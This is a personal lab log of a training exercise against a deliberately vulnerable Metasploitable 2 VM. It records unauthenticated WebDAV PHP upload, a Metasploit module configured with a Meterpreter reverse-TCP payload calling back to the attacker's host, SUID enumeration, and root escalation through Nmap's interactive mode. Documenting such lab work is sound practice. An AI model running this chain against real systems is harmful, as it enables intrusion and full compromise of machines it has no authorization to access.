# Daily Cybersecurity Log — Metasploitable 2 Lab

**Date:** 2026-08-11  
**Lab:** VMware Workstation + Metasploitable 2  
**Target:** `192.168.89.128`  
**Kali VMware interface:** `vmnet8` → `192.168.89.1`  
**Scope:** Isolated personal vulnerable VM lab

## Objectives
- Continue MS2 enumeration.
- Assess FTP, SMB and HTTP/WebDAV.
- Validate a real vulnerability manually.
- Obtain controlled initial access.
- Perform local enumeration.
- Identify and validate a privilege-escalation path.
- Clean up and shut down the VM.

## Network / VMware Notes
The MS2 lab uses the VMware `vmnet8` network. `vmnet1` was `192.168.123.1`, while MS2 was on `192.168.89.0/24`; therefore the relevant attacker-side address for this lab was `192.168.89.1`.

WireGuard was kept off during the lab because enabling it previously interfered with access to the MS2 VMware network.

## Findings

### FTP
- Service: `vsFTPd 2.3.4`
- Anonymous login: confirmed.
- Directory listing: confirmed.
- Anonymous write: denied.

### SMB
- SMB1/NT1 access was available.
- Anonymous access was confirmed.
- `tmp` share was accessible anonymously.
- Read/write access and directory creation were confirmed in `tmp`.

### HTTP / WebDAV
HTTP exposed an old Apache/PHP stack and several web applications.

Important paths found during enumeration included:
- `/dav/`
- `/phpMyAdmin/`
- `/twiki/`
- `/test/`
- `/cgi-bin/`
- `/phpinfo.php`

WebDAV was the strongest validated attack path.

## WebDAV Vulnerability Validation
The `/dav/` endpoint allowed unauthenticated WebDAV operations including `PUT`.

A harmless PHP file was manually uploaded with `curl` and then requested over HTTP. The response confirmed that PHP was executed rather than returned as source code.

This established:

`Unauthenticated WebDAV → arbitrary PHP upload → server-side PHP execution`

A controlled OS-command PHP test was also used to establish command execution.

## Initial Access
Metasploit module used:

`exploit/multi/http/webdav_upload_php`

Relevant configuration:
- `RHOSTS 192.168.89.128`
- `RPORT 80`
- `URI /dav/`
- `LHOST 192.168.89.1`
- `LPORT 4444`
- Payload: `php/meterpreter/reverse_tcp`

Metasploit confirmed the target as vulnerable, uploaded a PHP payload, executed it and opened a Meterpreter session.

The session ran as the Apache/web-server account `www-data`.

## Local Enumeration
From the Linux shell:
- Working directory: `/var/www/dav`
- Web-server user: `www-data`
- `/etc/os-release` was absent on this old MS2 installation.
- `sudo -l` requested a password, so sudo was not immediately useful.

SUID enumeration:

```bash
find / -perm -4000 -type f 2>/dev/null | sort
```

Important result:

`/usr/bin/nmap`

Permissions:

`-rwsr-xr-x 1 root root ... /usr/bin/nmap`

Nmap version:

`Nmap version 4.53`

Nmap also exposed its legacy interactive mode:

`nmap --interactive`

## Privilege Escalation
The SUID-root Nmap binary combined with its legacy interactive mode provided the privilege-escalation path.

From the Nmap interactive prompt, identity was checked with:

```text
!id
!whoami
```

The result confirmed root execution.

Final chain:

`Unauthenticated WebDAV → PHP execution → www-data → SUID Nmap 4.53 → interactive command execution → root`

## Cleanup
- Manual PHP test files were deleted.
- Meterpreter sessions were exited.
- The lab VM was shut down.

## Key Lessons
1. Validate scanner findings manually.
2. Identify the exact network interface before configuring reverse connections.
3. Do not assume every SUID binary is exploitable; inspect its version and functionality.
4. Initial access and privilege escalation are separate stages.
5. Preserve evidence before cleaning up.
6. A complete attack chain is more valuable than a collection of isolated exploits.
